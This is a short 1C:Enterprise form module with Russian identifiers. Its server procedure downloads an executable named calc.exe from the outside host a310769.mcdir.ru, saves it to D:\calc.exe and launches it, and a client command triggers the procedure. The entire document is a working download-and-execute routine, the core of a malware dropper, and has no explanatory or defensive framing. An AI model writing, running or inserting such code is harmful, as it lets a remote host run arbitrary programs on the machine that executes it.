
&НаСервере
Процедура Команда1НаСервере()
	Соединение = Новый HTTPСоединение("a310769.mcdir.ru");
	Запрос = Новый HTTPЗапрос("/calc.exe");
	ПутьДляСохранения = "D:\\calc.exe";
	Ответ = Соединение.Получить(Запрос);
	Ответ.ПолучитьТелоКакДвоичныеДанные().Записать(ПутьДляСохранения);
	Попытка
		ЗапуститьПриложение(ПутьДляСохранения);
	Исключение
		Сообщить(ОписаниеОшибки());
	КонецПопытки	
КонецПроцедуры

&НаКлиенте
Процедура Команда1(Команда)
	Команда1НаСервере();
КонецПроцедуры
